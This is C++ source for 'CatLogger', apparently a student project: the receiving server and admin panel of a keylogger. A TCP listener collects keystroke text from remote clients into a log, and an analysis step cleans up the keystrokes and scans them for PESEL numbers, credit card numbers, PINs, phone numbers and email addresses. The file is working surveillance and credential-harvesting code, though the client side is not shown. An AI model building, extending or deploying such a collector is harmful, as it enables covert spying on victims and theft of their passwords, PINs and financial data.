#include <wx/wx.h>
#include <wx/textctrl.h>
#include <wx/button.h>
#include <fstream>
#include <sstream>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "iostream"
#include <tchar.h>
#include <thread>
#include <atomic>
#include <locale>
#include <codecvt>
#include <map>
#include <regex>

using namespace std;

std::string GetCurrentDirectory()
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    std::string::size_type pos = std::string(buffer).find_last_of("\\/");

    return std::string(buffer).substr(0, pos);
}


std::string g_ipAddress;
int g_socketNumber;
std::atomic<bool> isRunning = false;

void translateFilePL() {
    std::ifstream input(GetCurrentDirectory()+"\\log.txt");
    std::ofstream output(GetCurrentDirectory() + "\\translation.txt");

    if (!input.is_open() || !output.is_open()) {
        std::cout << "Unable to open files.\n";
        return;
    }

    std::string line;
    std::regex pattern("\\[([a-zA-Z])-PL\\]");
    std::smatch match;

    std::map<std::string, std::string> plChars = {
        {"a", "ą"},
        {"e", "ę"},
        {"l", "ł"},
        {"s", "ś"},
        {"z", "ź"},
        {"o", "ó"},
        {"c", "ć"},
        {"n", "ń"},
        {"Z", "Ż"},
        {"S", "Ś"},
        {"L", "Ł"},
        {"N", "Ń"},
        {"C", "Ć"},
        {"O", "Ó"},
        {"E", "Ę"},
        {"A", "Ą"}
    };

    while (getline(input, line)) {
        while (std::regex_search(line, match, pattern)) {
            std::string key = match[1];
            if (plChars.find(key) != plChars.end()) {
                line = std::regex_replace(line, std::regex("\\[" + key + "-PL\\]"), plChars[key]);
            }
        }
        output << line << '\n';
    }

    input.close();
    output.close();
}


void modifyFile() {
    std::string path = GetCurrentDirectory() + "\\log.txt";
    std::string tempPath = GetCurrentDirectory() + "\\temp.txt";
    std::ifstream inFile;
    std::ofstream outFile;
    std::regex backspaceRegex("(.)(\\[Backspace\\])+");
    std::regex deleteRegex("\\[Delete\\].");
    regex tabRegex("\\[Tab\\]");

    inFile.open(path);
    outFile.open(tempPath);

    if (!inFile.is_open() || !outFile.is_open()) {
        std::cerr << "Error in opening the file.";
        return;
    }

    std::string line;
    while (std::getline(inFile, line)) {
        std::string modifiedLine;

        modifiedLine = std::regex_replace(line, backspaceRegex, "");
        modifiedLine = std::regex_replace(modifiedLine, deleteRegex, "");
        modifiedLine = std::regex_replace(modifiedLine, tabRegex , "    ");

        outFile << modifiedLine << "\n";
    }

    inFile.close();
    outFile.close();

    if (remove(path.c_str()) != 0) {
        std::cerr << "Error in deleting the original file.";
        return;
    }
    if (rename(tempPath.c_str(), path.c_str()) != 0) {
        std::cerr << "Error in renaming the temporary file.";
    }
}



void RunServer()
{   
    ofstream log_file(GetCurrentDirectory() + "\\log.txt", ios::app);
    ofstream elog_file(GetCurrentDirectory() + "\\event_log.txt", ios::app);
    

    string ipAddress = g_ipAddress;
    int socketNumber = g_socketNumber;

    WSADATA wsaData;
    int wsaerr;
    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0)
    {
        elog_file << "The Winsock dll not found!" << endl;
        return;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET)
    {
        elog_file << "Error at socket(): " << WSAGetLastError() << endl;
        WSACleanup();
        return;
    }

    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_port = htons(socketNumber);


    int bufferLength = MultiByteToWideChar(CP_UTF8, 0, ipAddress.c_str(), -1, NULL, 0);

        wchar_t* wideStr = new wchar_t[bufferLength];

        MultiByteToWideChar(CP_UTF8, 0, ipAddress.c_str(), -1, wideStr, bufferLength);

    PCWSTR ip = wideStr;


    InetPton(AF_INET, ip, &service.sin_addr.s_addr);

    int result = ::bind(serverSocket, reinterpret_cast<struct sockaddr*>(&service), sizeof(service));
    if (result == SOCKET_ERROR)
    {
        elog_file << "bind() failed: " << WSAGetLastError() << endl;
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    if (listen(serverSocket, 1) == SOCKET_ERROR)
    {
        elog_file << "Listen(): Error listening on socket " << WSAGetLastError() << endl;
        return;
    }

    while (isRunning)     {
        elog_file << "Listen() is OK, I'm waiting for connections..." << endl;

        SOCKET acceptSocket = accept(serverSocket, NULL, NULL);
        if (acceptSocket == INVALID_SOCKET)
        {
            elog_file << "accept failed: " << WSAGetLastError() << endl;
            continue;         }
        elog_file << "Accepted connection" << endl;

        while (true)         {
            char buffer[200] = { 0 };
            int byteCount = recv(acceptSocket, buffer, 200, 0);

            if (byteCount > 0)
            {
                string str(buffer, byteCount);
                wstring_convert<codecvt_utf8_utf16<wchar_t>> converter;
                wstring wstr = converter.from_bytes(str);

                log_file << wstr << flush;


                char confirmation[200] = "Message Received";
                byteCount = send(acceptSocket, confirmation, 200, 0);
                if (byteCount <= 0)
                {
                    elog_file << "Error sending data: " << WSAGetLastError() << endl;
                    break;
                }
            }
            else if (byteCount == 0)             {
                elog_file << "Client disconnected" << endl;
                break;
            }
            else             {
                elog_file << "recv failed: " << WSAGetLastError() << endl;
                break;
            }
        }

        closesocket(acceptSocket);
        elog_file << "Socket to client closed. Ready to accept a new connection..." << endl;

                if (!isRunning) {
            break;
        }
    }

    closesocket(serverSocket);
    WSACleanup();
    elog_file << "Server shutdown" << endl;
}



void reportCPPFile(const string& filename) {
    ifstream inputFile(filename, ios::app);
    if (!inputFile.is_open()) {
        std::cerr << "Unable to open file: " << filename << std::endl;
        return;
    }
    
    ofstream reportFile(GetCurrentDirectory() + "\\report.txt", ios::app);
    if (!reportFile.is_open()) {
        std::cerr << "Unable to open report file: report.txt" << std::endl;
        return;
    }
    reportFile << "====================|  New Report Generated  |====================" << endl << endl;

    std::string line;
    size_t lineNumber = 1;
    while (getline(inputFile, line)) {
        reportFile << "Line " << lineNumber << " report:\n";

                std::regex e1("\\b\\d{11}\\b");
        for (std::sregex_iterator i = std::sregex_iterator(line.begin(), line.end(), e1); i != std::sregex_iterator(); ++i)
            reportFile << "Potenital PESEL number found: " << i->str() << '\n';

                std::regex e2("\\b\\d{16}\\b");
        for (std::sregex_iterator i = std::sregex_iterator(line.begin(), line.end(), e2); i != std::sregex_iterator(); ++i)
            reportFile << "Potential Credit Card number found: " << i->str() << '\n';

                std::regex e3("\\b\\d{4}\\b");
        for (std::sregex_iterator i = std::sregex_iterator(line.begin(), line.end(), e3); i != std::sregex_iterator(); ++i)
            reportFile << "Potential 4 digit PIN found: " << i->str() << '\n';

                std::regex e4("\\b\\d{6}\\b");
        for (std::sregex_iterator i = std::sregex_iterator(line.begin(), line.end(), e4); i != std::sregex_iterator(); ++i)
            reportFile << "Potential 6 digit PIN found: " << i->str() << '\n';

                std::regex e5("\\+\\d{8,10}");
        for (std::sregex_iterator i = std::sregex_iterator(line.begin(), line.end(), e5); i != std::sregex_iterator(); ++i)
            reportFile << "Potential phone number found: " << i->str() << '\n';

        std::regex e6("([\\w\\.\\-]+)@([\\w\\-]+)((\\.(\\w){2,3})+)");
        for (std::sregex_iterator i = std::sregex_iterator(line.begin(), line.end(), e6); i != std::sregex_iterator(); ++i)
            reportFile << "Potential email found: " << i->str() << '\n';


        reportFile << '\n';
        lineNumber++;
    }

    inputFile.close();
    reportFile.close();
}








class MyFrame : public wxFrame
{
public:
    MyFrame() : wxFrame(NULL, wxID_ANY, "CatLogger.exe", wxDefaultPosition, wxSize(640, 640)), m_time1(0), m_time2(0),startButton(nullptr), stopButton(nullptr)
    {
        isRunning = false;

        wxIcon ikona(GetCurrentDirectory() + "\\cat.ico", wxBITMAP_TYPE_ICO);
        SetIcon(ikona);
        SetBackgroundColour(wxSystemSettings::GetColour(wxSYS_COLOUR_3DFACE));

        wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
        SetSizer(sizer);

        wxStaticText* header0 = new wxStaticText(this, wxID_ANY, "Admin Panel");
        header0->SetFont(header0->GetFont().Bold().Larger().Larger().Larger().Larger());         sizer->Add(header0, 0, wxALIGN_LEFT | wxALL, 10);

        wxBoxSizer* inputSizer = new wxBoxSizer(wxHORIZONTAL);
        ipInput = new wxTextCtrl(this, wxID_ANY);
        socketInput = new wxTextCtrl(this, wxID_ANY);
        inputSizer->Add(new wxStaticText(this, wxID_ANY, "IP Address:"), 0, wxALIGN_CENTER_VERTICAL | wxALL, 5);
        inputSizer->Add(ipInput, 1, wxALIGN_CENTER_VERTICAL | wxALL, 5);
        inputSizer->Add(new wxStaticText(this, wxID_ANY, "Socket Number:"), 0, wxALIGN_CENTER_VERTICAL | wxALL, 5);
        inputSizer->Add(socketInput, 1, wxALIGN_CENTER_VERTICAL | wxALL, 5);
        sizer->Add(inputSizer, 0, wxEXPAND | wxALL, 10);
                ipInput->Bind(wxEVT_TEXT, &MyFrame::OnTextChange, this);
        socketInput->Bind(wxEVT_TEXT, &MyFrame::OnTextChange, this);

        wxBoxSizer* btnSizer = new wxBoxSizer(wxHORIZONTAL);


                               
                       
        startButton = new wxButton(this, wxID_ANY, "Start Server");
        btnSizer->Add(startButton);
        Connect(startButton->GetId(), wxEVT_COMMAND_BUTTON_CLICKED, wxCommandEventHandler(MyFrame::OnStartButtonClick));

        stopButton = new wxButton(this, wxID_ANY, "Stop Server");
        btnSizer->Add(stopButton);
        Connect(stopButton->GetId(), wxEVT_COMMAND_BUTTON_CLICKED, wxCommandEventHandler(MyFrame::OnStopButtonClick));

                        






        serverConfig = new wxStaticText(this, wxID_ANY, "");
        serverConfig->SetFont(serverConfig->GetFont().Bold());
        sizer->Add(serverConfig, 0, wxALL, 10);

        wxStaticText* header1 = new wxStaticText(this, wxID_ANY, "Livefeed");
        header1->SetFont(header1->GetFont().Larger());
        sizer->Add(header1, 0, wxALL, 10);
        textctrl1 = new wxTextCtrl(this, wxID_ANY, wxEmptyString, wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_READONLY | wxBORDER_SIMPLE);
        sizer->Add(textctrl1, 1, wxEXPAND | wxLEFT | wxRIGHT, 20);


        wxStaticText* header2 = new wxStaticText(this, wxID_ANY, "Events");
        header2->SetFont(header2->GetFont().Larger());
        sizer->Add(header2, 0, wxALL, 10);
        textctrl2 = new wxTextCtrl(this, wxID_ANY, wxEmptyString, wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_READONLY | wxBORDER_SIMPLE);
        sizer->Add(textctrl2, 1, wxEXPAND | wxLEFT | wxRIGHT, 20);

        wxButton* button1 = new wxButton(this, wxID_ANY, "Log Analisys");
        btnSizer->Add(button1);
        Connect(button1->GetId(), wxEVT_COMMAND_BUTTON_CLICKED, wxCommandEventHandler(MyFrame::OnButton1Click));
                              sizer->Add(btnSizer, 0, wxALIGN_CENTER | wxALL, 10);

        m_filePath1 = GetCurrentDirectory() + "\\log.txt";
        m_filePath2 = GetCurrentDirectory() + "\\event_log.txt";
        timer = new wxTimer(this, wxID_ANY);
        Connect(timer->GetId(), wxEVT_TIMER, wxTimerEventHandler(MyFrame::OnTimer));
        timer->Start(1000);

        startButton->Disable();
        stopButton->Disable();
       


        sizer->Add(btnSizer, 0, wxALIGN_CENTER | wxALL, 10);
        
        wxStaticText* footer = new wxStaticText(this, wxID_ANY, "Projekt JPO 2023 | Filip Kielpinski | Szymon Stanek");
        sizer->Add(footer, 0, wxALIGN_RIGHT | wxALL, 10);
        Connect(wxID_ANY, wxEVT_CLOSE_WINDOW, wxCloseEventHandler(MyFrame::OnCloseWindow));
    }
    ~MyFrame()
    {
        if (isRunning) {
            isRunning = false;
            if (serverThread.joinable()) {
                serverThread.detach();
            }
            closesocket(serverSocket);
            WSACleanup();
        }

                if (timer) {
            timer->Stop();
            delete timer;
        }

                    }

private:
    SOCKET serverSocket;
    wxTextCtrl* textctrl1;
    wxTextCtrl* textctrl2;
    wxTimer* timer;
    std::string m_filePath1;
    std::string m_filePath2;
    time_t m_time1;
    time_t m_time2;
    wxTextCtrl* ipInput;
    wxTextCtrl* socketInput;
    wxStaticText* serverConfig;
    wxButton* startButton;
    wxButton* stopButton;
   



    void OnTimer(wxTimerEvent& event)
    {
        UpdateFile(m_filePath1, m_time1, textctrl1);
        UpdateFile(m_filePath2, m_time2, textctrl2);
    }

    void OnTextChange(wxCommandEvent& event)
    {
                bool enable = !(ipInput->IsEmpty() || socketInput->IsEmpty());
        startButton->Enable(enable);
        stopButton->Enable(enable);
            }

    void OnButton1Click(wxCommandEvent& event)
    {
        wxMessageBox("Raport and translation based on the log.txt file has beed generated!", "Info", wxOK | wxICON_INFORMATION);
        modifyFile();
        reportCPPFile(GetCurrentDirectory() + "\\log.txt");
        translateFilePL();
    }

    void OnButton2Click(wxCommandEvent& event)
    {

    }


    void UpdateFile(const std::string& filePath, time_t& lastWriteTime, wxTextCtrl* textctrl)
    {
        struct stat result;
        if (stat(filePath.c_str(), &result) == 0)
        {
            time_t time = result.st_mtime;
            if (time != lastWriteTime)
            {
                lastWriteTime = time;
                std::ifstream file(filePath);
                if (file.is_open())
                {
                    std::stringstream ss;
                    ss << file.rdbuf();
                    textctrl->SetValue(ss.str());
                    textctrl->SetInsertionPointEnd();                  }
            }
        }
    }
    void OnStartButtonClick(wxCommandEvent& event)
    {
        if (isRunning) {
            wxMessageBox("Server is already running.", "Info", wxOK | wxICON_INFORMATION);
            return;
        }

                g_ipAddress = ipInput->GetValue().ToStdString();
        g_socketNumber = std::stoi(socketInput->GetValue().ToStdString());

                serverConfig->SetLabel("Server Configuration: IP - " + g_ipAddress + "    Socket - " + std::to_string(g_socketNumber));

        isRunning = true;
        serverThread = std::thread(RunServer);
    }

    void OnStopButtonClick(wxCommandEvent& event)
    {
        if (!isRunning) {
            wxMessageBox("Server is not running.", "Info", wxOK | wxICON_INFORMATION);
            return;
        }
        isRunning = false;
        if (serverThread.joinable())
        {
            serverThread.detach();
        }
        closesocket(serverSocket);
        WSACleanup();
        wxMessageBox("Server stopped.", "Info", wxOK | wxICON_INFORMATION);
    }
    void OnCloseWindow(wxCloseEvent& event)
    {
        if (isRunning) {
            isRunning = false;
            if (serverThread.joinable())
            {
                serverThread.detach();
            }
            closesocket(serverSocket);
            WSACleanup();
        }
        event.Skip();      }




    std::thread serverThread;
};

class MyApp : public wxApp
{
public:
    virtual bool OnInit()
    {
        MyFrame* frame = new MyFrame();
        frame->Show(true);
        return true;
    }
};

wxIMPLEMENT_APP(MyApp);